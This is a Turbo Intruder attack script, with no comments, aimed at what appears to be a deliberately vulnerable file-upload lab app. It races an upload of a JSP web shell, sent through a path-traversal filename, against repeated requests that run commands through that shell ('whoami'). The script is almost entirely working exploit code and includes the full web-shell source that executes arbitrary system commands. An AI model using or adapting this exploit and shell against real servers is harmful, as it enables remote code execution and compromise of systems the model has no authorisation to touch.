def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /FileUploadVul/fileuploadservlet HTTP/1.1

Host: 10.59.90.133:8080

Content-Length: 888	

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://10.59.90.133:8080

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHhbB0AKW8RhnF69J

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://10.59.90.133:8080/FileUploadVul/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: JSESSIONID=6C242B0E9E3DE2936E2EBFD6758926C9

Connection: close



------WebKitFormBoundaryHhbB0AKW8RhnF69J

Content-Disposition: form-data; name="fileName"; filename="../mys.jsp"

Content-Type: application/octet-stream



<%@ page import="java.util.*,java.io.*" %>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
</PRE>
</BODY>
</HTML>


------WebKitFormBoundaryHhbB0AKW8RhnF69J--
'''

    request2 = '''
GET /FileUploadVul/mys.jsp?cmd=whoami HTTP/1.1

Host: 10.59.90.133:8080

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8

Referer: http://10.59.90.133:8080/FileUploadVul/fileuploadservlet

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: JSESSIONID=6C242B0E9E3DE2936E2EBFD6758926C9

If-None-Match: W/"13000-1704947200381"

If-Modified-Since: Thu, 11 Jan 2024 04:26:40 GMT

Connection: close


'''
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
